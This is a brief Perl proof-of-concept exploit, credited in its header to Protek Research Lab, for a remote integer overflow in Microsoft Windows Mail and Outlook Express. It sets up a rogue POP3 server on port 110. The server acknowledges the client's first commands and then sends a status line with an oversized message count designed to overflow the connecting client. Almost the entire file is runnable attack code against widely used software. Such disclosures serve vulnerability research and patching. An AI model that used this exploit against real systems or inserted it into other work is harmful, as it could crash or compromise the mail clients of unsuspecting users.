#!/usr/bin/perl -w
# Found by Francis Provencher for Protek Research Lab's
# {PRL} Microsoft Windows Mail CLient & outlook express Remote Integer Overflow
#



use IO::Socket;

$port = 110;

$serv = IO::Socket::INET->new(Proto=>'tcp',
LocalPort=>$port,
Listen=>1)
or die "Error: listen($port)\n";

$cli = $serv->accept() or die "Error: accept()\n";


$cli->send("+OK\r\n");
$cli->recv($recvbuf, 512);
$cli->send("+OK\r\n");
$cli->recv($recvbuf, 512);
$cli->send("+OK\r\n");
$cli->recv($recvbuf, 512);
$cli->send("+OK 357913944 100\r\n");